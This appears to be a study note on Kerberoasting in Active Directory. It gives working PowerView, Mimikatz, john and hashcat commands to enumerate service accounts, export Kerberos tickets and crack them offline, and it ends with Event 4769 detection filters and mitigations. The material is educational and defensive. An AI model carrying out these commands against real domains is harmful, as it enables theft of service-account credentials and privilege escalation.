# What is Kerberoasting, why is works, how it works & how to mitigate it

## What is Kerberoasting

Kerberoasting is a proccess of Offline cracking of a service account password.

## How does Kerberoasting work?

The kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of the service account. This makes it possible to request a ticket and do an offline password bruteforce attack.

## Why does Kerberoasting work?

Service accounts are many times ignored, passwords rarely are changed and usually have privileged access.

## What can be done using a Service Account Password hash?

Password hashes of a service Account could be used to create a silver ticket.

## How to execute a kerberoasting attack

### Tools

> [PowerView] (<https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView>)
>
> [Some other useful tools for Kerberoasting] (<https://github.com/nidem/kerberoast>)

### Import Module

```PS
Import-Module .\Powerview.ps1
. .\Powerview.ps1
```

### Find user accounts that are used as service account

```PS
    Get-NetUser -SPN
```

### Request a TGS in memory

```PS
    Add-Type -AssemblyName System.IdentityModel 
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" 
        if there is some issue requesting the TGS from powershell directly we can also use PowerView for it:
            Request-SPNTicket
```

### Check if teh SPN has been granted

```PS
    klist
```

### Export all tickets using Mimikatz

```ps
    Mimikatz -Command '"Kerberos::list /export"'
```

### The password thank can be cracked using John or Hashcat or tgsrepcrack.py

```PS
    john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
    hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
    ./tgsrepcrack.py wordlist.txt hashes.kerberoast.kirbi
```

## Mitigation

Kerberoast is very stealthy if exploitable

- Security Event ID 4769 â€“ A Kerberos ticket was requested
- Since 4769 is very frequent, lets filter the results:
  - Service name should not be krbtgt
  - Service name does not end with $ (to filter out machine accounts used for services)
  - Account name should not be machine@domain (to filter out requests from machines)
  - Failure code is '0x0' (to filter out failures, 0x0 is success)
  - Most importantly, ticket encryption type is 0x17
- Mitigation:
  - Service Account Passwords should be hard to guess (greater than 25 characters)
  - Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)

```PS
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
